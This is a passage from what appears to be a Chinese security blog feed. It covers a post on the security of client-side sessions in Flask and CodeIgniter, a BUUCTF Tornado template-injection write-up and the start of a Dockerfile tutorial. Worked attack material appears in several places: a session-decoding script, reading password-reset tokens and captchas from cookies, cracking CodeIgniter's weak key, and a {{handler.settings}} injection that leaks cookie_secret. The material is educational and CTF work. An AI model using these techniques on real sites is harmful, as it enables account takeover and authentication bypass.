= self.get_signing_serializer(app).dumps(dict(session))</span><br><span class="line">        response.set_cookie(app.session_cookie_name, val,</span><br><span class="line">                            <span class="attribute">expires</span>=expires, <span class="attribute">httponly</span>=httponly,</span><br><span class="line">                            <span class="attribute">domain</span>=domain, <span class="attribute">path</span>=path, <span class="attribute">secure</span>=secure)</span><br></pre></td></tr></table></figure></div>
<p>主要看最后两行代码，新建了URLSafeTimedSerializer类 ，用它的dumps方法将类型为字典的session对象序列化成字符串，然后用response.set_cookie将最后的内容保存在cookie中。</p>
<p>那么我们可以看一下URLSafeTimedSerializer是做什么的：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Signer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="string">"""Signs the given string."""</span></span><br><span class="line">        <span class="keyword">return</span> value + want_bytes(self.sep) + self.get_signature(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_signature</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="string">"""Returns the signature for the given value"""</span></span><br><span class="line">        value = want_bytes(value)</span><br><span class="line">        key = self.derive_key()</span><br><span class="line">        sig = self.algorithm.get_signature(key, value)</span><br><span class="line">        <span class="keyword">return</span> base64_encode(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Serializer</span><span class="params">(object)</span>:</span></span><br><span class="line">    default_serializer = json</span><br><span class="line">    default_signer = Signer</span><br><span class="line">    <span class="comment"># ....</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj, salt=None)</span>:</span></span><br><span class="line">        <span class="string">"""Returns a signed string serialized with the internal serializer.</span></span><br><span class="line"><span class="string">        The return value can be either a byte or unicode string depending</span></span><br><span class="line"><span class="string">        on the format of the internal serializer.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        payload = want_bytes(self.dump_payload(obj))</span><br><span class="line">        rv = self.make_signer(salt).sign(payload)</span><br><span class="line">        <span class="keyword">if</span> self.is_text_serializer:</span><br><span class="line">            rv = rv.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="string">"""Dumps the encoded object. The return value is always a</span></span><br><span class="line"><span class="string">        bytestring. If the internal serializer is text based the value</span></span><br><span class="line"><span class="string">        will automatically be encoded to utf-8.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> want_bytes(self.serializer.dumps(obj))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLSafeSerializerMixin</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""Mixed in with a regular serializer it will attempt to zlib compress</span></span><br><span class="line"><span class="string">    the string to make it shorter if necessary. It will also base64 encode</span></span><br><span class="line"><span class="string">    the string so that it can safely be placed in a URL.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_payload</span><span class="params">(self, payload)</span>:</span></span><br><span class="line">        decompress = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">            payload = payload[<span class="number">1</span>:]</span><br><span class="line">            decompress = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json = base64_decode(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> BadPayload(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                <span class="string">'an exception'</span>, original_error=e)</span><br><span class="line">        <span class="keyword">if</span> decompress:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                json = zlib.decompress(json)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">raise</span> BadPayload(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                    <span class="string">'decoding the payload'</span>, original_error=e)</span><br><span class="line">        <span class="keyword">return</span> super(URLSafeSerializerMixin, self).load_payload(json)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        json = super(URLSafeSerializerMixin, self).dump_payload(obj)</span><br><span class="line">        is_compressed = <span class="literal">False</span></span><br><span class="line">        compressed = zlib.compress(json)</span><br><span class="line">        <span class="keyword">if</span> len(compressed) &lt; (len(json) - <span class="number">1</span>):</span><br><span class="line">            json = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">        base64d = base64_encode(json)</span><br><span class="line">        <span class="keyword">if</span> is_compressed:</span><br><span class="line">            base64d = <span class="string">b'.'</span> + base64d</span><br><span class="line">        <span class="keyword">return</span> base64d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLSafeTimedSerializer</span><span class="params">(URLSafeSerializerMixin, TimedSerializer)</span>:</span></span><br><span class="line">    <span class="string">"""Works like :class:`TimedSerializer` but dumps and loads into a URL</span></span><br><span class="line"><span class="string">    safe string consisting of the upper and lowercase character of the</span></span><br><span class="line"><span class="string">    alphabet as well as ``'_'``, ``'-'`` and ``'.'``.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    default_serializer = compact_json</span><br></pre></td></tr></table></figure></div>
<p>主要关注dump_payload、dumps，这是序列化session的主要过程。</p>
<p>可见，序列化的操作分如下几步：</p>
<ul>
<li>json.dumps 将对象转换成json字符串，作为数据</li>
<li>如果数据压缩后长度更短，则用zlib库进行压缩</li>
<li>将数据用base64编码</li>
<li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割<br>第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。</li>
</ul>
<p>最后，我们在cookie中就能看到设置好的session了：<br><img src="https://i.imgur.com/gz9Z60g.png" alt=""><br>注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>
<h2 id="flask客户端session导致敏感信息泄露"><a href="#flask客户端session导致敏感信息泄露" class="headerlink" title="flask客户端session导致敏感信息泄露"></a>flask客户端session导致敏感信息泄露</h2><p>我曾遇到过一个案例，目标是flask开发的一个简历管理系统，在测试其找回密码功能的时候，我收到了服务端设置的session。</p>
<p>我在0x02中说过，flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。编写如下代码解密session：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></div>
<p>例如，我解密0x02中演示的session：   </p>
<p><img src="https://i.imgur.com/hXx5sTj.png" alt="">   </p>
<p>通过解密目标站点的session，我发现其设置了一个名为token、值是一串md5的键。猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。通过这个过程，我就能修改任意用户密码了。</p>
<p>这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。但因为flask的session是存储在cookie中且仅签名而未加密，所以我们就可以直接读取这个token了。   </p>
<h2 id="flask验证码绕过漏洞"><a href="#flask验证码绕过漏洞" class="headerlink" title="flask验证码绕过漏洞"></a>flask验证码绕过漏洞</h2><p>这是客户端session的另一个常见漏洞场景。</p>
<p>我们用一个实际例子认识这一点：<a href="https://github.com/shonenada/flask-captcha" target="_blank" rel="noopener">https://github.com/shonenada/flask-captcha</a> 。这是一个为flask提供验证码的项目，我们看到其中的view文件：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROCESSING"><figure class="iseeu highlight /processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">random</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    from cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line">except ImportError:</span><br><span class="line">    from io <span class="keyword">import</span> BytesIO as StringIO</span><br><span class="line"></span><br><span class="line">from flask <span class="keyword">import</span> Blueprint, make_response, current_app, session</span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> captcha</span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> <span class="built_in">background</span></span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> <span class="built_in">curve</span></span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> <span class="built_in">noise</span></span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> <span class="built_in">smooth</span></span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> <span class="built_in">text</span></span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> offset</span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> <span class="built_in">rotate</span></span><br><span class="line">from wheezy.captcha.<span class="built_in">image</span> <span class="keyword">import</span> warp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">captcha_bp = Blueprint(<span class="string">'captcha'</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sample_chars():</span><br><span class="line">    characters = current_app.config[<span class="string">'CAPTCHA_CHARACTERS'</span>]</span><br><span class="line">    char_length = current_app.config[<span class="string">'CAPTCHA_CHARS_LENGTH'</span>]</span><br><span class="line">    captcha_code = <span class="built_in">random</span>.sample(characters, char_length)</span><br><span class="line">    <span class="keyword">return</span> captcha_code</span><br><span class="line"></span><br><span class="line">@captcha_bp.route(<span class="string">'/captcha'</span>, endpoint=<span class="string">"captcha"</span>)</span><br><span class="line">def captcha_view():</span><br><span class="line">    out = StringIO()</span><br><span class="line">    captcha_image = captcha(drawings=[</span><br><span class="line">        <span class="built_in">background</span>(),</span><br><span class="line">        <span class="built_in">text</span>(fonts=current_app.config[<span class="string">'CAPTCHA_FONTS'</span>],</span><br><span class="line">             drawings=[warp(), <span class="built_in">rotate</span>(), offset()]),</span><br><span class="line">        <span class="built_in">curve</span>(),</span><br><span class="line">        <span class="built_in">noise</span>(),</span><br><span class="line">        <span class="built_in">smooth</span>(),</span><br><span class="line">    ])</span><br><span class="line">    captcha_code = <span class="string">''</span>.<span class="built_in">join</span>(sample_chars())</span><br><span class="line">    imgfile = captcha_image(captcha_code)</span><br><span class="line">    session[<span class="string">'captcha'</span>] = captcha_code</span><br><span class="line">    imgfile.<span class="built_in">save</span>(out, <span class="string">'PNG'</span>)</span><br><span class="line">    out.seek(<span class="number">0</span>)</span><br><span class="line">    response = make_response(out.read())</span><br><span class="line">    response.content_type = <span class="string">'image/png'</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></div>
<p>可见，其生成验证码后，就存储在session中了：session[‘captcha’] = captcha_code。</p>
<p>我们用浏览器访问/captcha，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：<br><img src="https://i.imgur.com/0568RyZ.png" alt=""><br>可见，我成功获取了验证码的值，进而可以绕过验证码的判断。</p>
<p>这也是客户端session的一种错误使用方法。</p>
<h2 id="CodeIgniter-2-1-4-session伪造及对象注入漏洞"><a href="#CodeIgniter-2-1-4-session伪造及对象注入漏洞" class="headerlink" title="CodeIgniter 2.1.4 session伪造及对象注入漏洞"></a>CodeIgniter 2.1.4 session伪造及对象注入漏洞</h2><p>Codeigniter 2的session也储存在session中，默认名为ci_session，默认值如下：   </p>
<p><img src="https://i.imgur.com/G1zysfj.png" alt="">   </p>
<p>可见，session数据被用PHP自带的serialize函数进行序列化，并签名后作为ci_session的值。原理上和flask如出一辙，我就不重述了。但好在codeigniter2支持对session进行加密，只需在配置文件中设置$config[‘sess_encrypt_cookie’] = TRUE;即可。</p>
<p>在CI2.1.4及以前的版本中，存在一个弱加密漏洞（ <a href="https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability" target="_blank" rel="noopener">https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability</a> ），如果目标环境中没有安装Mcrypt扩展，则CI会使用一个相对比较弱的加密方式来处理session:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">_xor_encode</span><span class="params">($string, $key)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"> $rand = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"> <span class="keyword">while</span> (strlen($rand) &lt; <span class="number">32</span>)</span></span><br><span class="line"><span class="php"> &#123;</span></span><br><span class="line"><span class="php">  $rand .= mt_rand(<span class="number">0</span>, mt_getrandmax());</span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"> $rand = <span class="keyword">$this</span>-&gt;hash($rand);</span></span><br><span class="line"><span class="php"> $enc = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"> <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++)</span></span><br><span class="line"><span class="php"> &#123;</span></span><br><span class="line"><span class="php">  $enc .= substr($rand, ($i % strlen($rand)), <span class="number">1</span>).(substr($rand, ($i % strlen($rand)), <span class="number">1</span>) ^ substr($string, $i, <span class="number">1</span>));</span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_xor_merge($enc, $key);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">_xor_merge</span><span class="params">($string, $key)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"> $hash = <span class="keyword">$this</span>-&gt;hash($key);</span></span><br><span class="line"><span class="php"> $str = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"> <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++)</span></span><br><span class="line"><span class="php"> &#123;</span></span><br><span class="line"><span class="php">  $str .= substr($string, $i, <span class="number">1</span>) ^ substr($hash, ($i % strlen($hash)), <span class="number">1</span>);</span></span><br><span class="line"><span class="php"> &#125;</span></span><br><span class="line"><span class="php"> <span class="keyword">return</span> $str;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>其中用到了mt_rand、异或等存在大量缺陷的方法。我们通过几个简单的脚本（ <a href="https://github.com/Dionach/CodeIgniterXor" target="_blank" rel="noopener">https://github.com/Dionach/CodeIgniterXor</a> ），即可在4秒到4分钟的时间，破解CI2的密钥。</p>
<p>获取到了密钥，我们即可篡改任意session，并自己签名及加密，最后伪造任意用户，注入任意对象，甚至通过反序列化操作造成更大的危害。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我以三个案例来说明了客户端session的安全问题。</p>
<p>上述三个问题，如果session是储存在服务器文件或数据库中，则不会出现。当然，考虑到flask和ci都是非常轻量的web框架，很可能运行在无法操作文件系统或没有数据库的服务器上，所以客户端session是无法避免的。</p>
<p>除此之外，我还能想到其他客户端session可能存在的安全隐患：</p>
<p>签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session<br>任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞（ <a href="http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E</a> ）<br>如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的<br>上面说的几点，各位CTF出题人可以拿去做文章啦~嘿嘿。</p>
<p>相对的，作为一个开发者，如果我们使用的web框架或web语言的session是存储在客户端中，那就必须牢记下面几点：</p>
<p>没有加密时，用户可以看到完整的session对象<br>加密/签名不完善或密钥泄露的情况下，用户可以修改任意session<br>使用强健的加密及签名算法，而不是自己造（反例discuz）</p>
<h3 id="摘自P师傅博客"><a href="#摘自P师傅博客" class="headerlink" title="摘自P师傅博客"></a>摘自P师傅博客</h3><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>2019强网杯&#39;&#39;随便注&#39;&#39;</title>
    <url>/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF | 2018护网杯(WEB)easy_tornado(模板注入)</title>
    <url>/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</url>
    <content><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src="https://i.imgur.com/zsu1I4d.png" alt="1"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line">flag in /fllllllllllllag</span><br><span class="line">render</span><br><span class="line">md5(<span class="name">cookie_secret+md5</span>(<span class="name">filename</span>))</span><br></pre></td></tr></table></figure></div>
<p>从上面三个信息得知flag在/fllllllllllllag文件中<br>render这个卡住了看了WP 说render是模板注入<br>第三个文件说了文件名的哈希方法     </p>
<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Tornado</span>是一种 <span class="selector-tag">Web</span> 服务器软件的开源版本。<span class="selector-tag">Tornado</span> 和现在的主流 <span class="selector-tag">Web</span> 服务器框架</span><br><span class="line">(包括大多数 Python 的框架)有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure></div>
<p>然后就是这段代码md5(cookie_secret+md5(filename)) 根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块 我们得想办法获得cookie_secret    </p>
<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
<p>通过模板注入方式我们可以构造</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">http://de289baa-da8f<span class="string">-4380</span><span class="string">-954</span>c<span class="string">-4</span>b9c90a1ba95.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">//得到'cookie_secret': 'bf0b29ee<span class="string">-5520</span><span class="string">-4</span>b5b-a8a6-ffd19aa464f9'&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://i.imgur.com/FNG9lhZ.png" alt="2"><br>得到secret后，就是计算访问flag文件的hash，获取flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret="bf0b29ee-5520-4b5b-a8a6-ffd19aa464f9"</span><br><span class="line">hash.<span class="keyword">update</span>(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.<span class="keyword">update</span>((cookie_secret+s1).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(hash.hexdigest())</span><br><span class="line">//hashlib.md5（）#获取一个md5加密算法对象</span><br><span class="line">//.hexdigest()返回摘要，作为十六进制数据字符串值</span><br><span class="line">//python3跟python2区别：python3下字符串为Unicode类型，而hash传递时需要的是utf<span class="number">-8</span>类型，因此，需要类型转换</span><br></pre></td></tr></table></figure></div>
<p>然后得到flag<br><img src="https://i.imgur.com/rJiBStL.png" alt=""></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">04</span>c40e94<span class="number">-4087</span><span class="number">-49e3</span><span class="number">-85</span>c6<span class="number">-74</span>a9472025c0&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerfile解析</title>
    <url>/undefined/dockerfile%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a><font color = yellow >Dockerfile</font></h1><h2 id="dockerfile是什么："><a href="#dockerfile是什么：" class="headerlink" title="dockerfile是什么："></a><font color = red>dockerfile是什么：</font></h2><p>Dockerfile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p>
<h3 id="构建三步骤"><a href="#构建三步骤" class="headerlink" title="构建三步骤"></a><font color = gree >构建三步骤</font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>丶编写Dockerfile 文件</span><br><span class="line"><span class="number">2</span>丶docker build 创建镜像</span><br><span class="line"><span class="number">3</span>丶docker run 运行容器</span><br></pre></td></tr></table></figure></div>
<h3 id="文件什么样？"><a href="#文件什么样？" class="headerlink" title="文件什么样？"></a><font color = gree>文件什么样？</font></h3><h4 id="以我们熟悉的centos为例："><a href="#以我们熟悉的centos为例：" class="headerlink" title="以我们熟悉的centos为例："></a>以我们熟悉的centos为例：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line"><span class="keyword">MAINTAINER</span> The CentOS Project &lt;cloud-ops@centos.org&gt;</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> c68-docker.tar.xz /</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> name=<span class="string">"CentOS Base Image"</span> \</span></span><br><span class="line"><span class="bash">    vendor=<span class="string">"CentOS"</span> \</span></span><br><span class="line"><span class="bash">    license=<span class="string">"GPLv2"</span> \</span></span><br><span class="line"><span class="bash">    build-date=<span class="string">"2016-06-02"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Default command</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"/bin/bash"</span>]</span></span><br></pre></td></tr></table></figure></div>
<h1 id="Dockerfile-构建过程解析"><a href="#Dockerfile-构建过程解析" class="headerlink" title=" Dockerfile 构建过程解析"></a><font color = yellow> Dockerfile 构建过程解析</font></h1><h3 id="Docker内容基础知识"><a href="#Docker内容基础知识" class="headerlink" title="Docker内容基础知识"></a><font color = gree>Docker内容基础知识</font></h3><ul>
<li>1：每条表指令都必须为大写字母且后面要跟随至少一个参数</li>
<li>2：指令按照从上到下，顺序执行</li>
<li>3：#表示注释</li>
<li>4：每条指令都会创建一个新的镜像层，并对镜像进行提交<h3 id="Docker执行Dockerfile的大致流程"><a href="#Docker执行Dockerfile的大致流程" class="headerlink" title="Docker执行Dockerfile的大致流程"></a><font color = gree>Docker执行Dockerfile的大致流程</font></h3></li>
<li>1：docker从基础镜像运行一个容器</li>
<li>2：执行一条指令并对容器做出修改</li>
<li>3：执行类似docker commit的操作提交一个新的镜像层</li>
<li>4：docker再基于刚提交的镜像运行一个新容器</li>
<li>5：执行dockerfile中的下一条指令知道所有指令都执行完成<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h4 id="从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断"><a href="#从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断" class="headerlink" title="从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断"></a><font color = red>从应用软件的角度来看，Dockerfile丶Docker镜像与Docker容器分别代表软件的三个不同截断</font></h4></li>
<li>Dockerfile是原件的原材料</li>
<li>Docker镜像是原件的交付品</li>
<li>Docker容器则可以认为是软件的运行态<br>Dockerfile面向开发，Docker镜像成为交付标准，Docker容器则涉及部署与运维，三者缺一不可</li>
</ul>
<hr>
<ul>
<li><p>1丶Dockerfile，需要定义一个Dockerfile，Dockerfile定 义了进程需要的一-切东西。Dockerfile涉及的内容包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进程和内核进程（当应用进程需要和系统服务和内核进程打交道，这时需要考虑如何设计namespace的权限控制）等等；</p>
</li>
<li><p>2丶Docker镜像，在用Dockerfile定义-一个 文件之后，docker build时会产生–个Docker镜像，当运行Docker镜像时，会真正开始提供服务；</p>
</li>
<li><p>3丶Docker容器，容器是直接提供服务的。</p>
</li>
</ul>
<hr>
<h1 id="DockerFile体系结构"><a href="#DockerFile体系结构" class="headerlink" title="DockerFile体系结构"></a><font color = yellow>DockerFile体系结构</font></h1><ul>
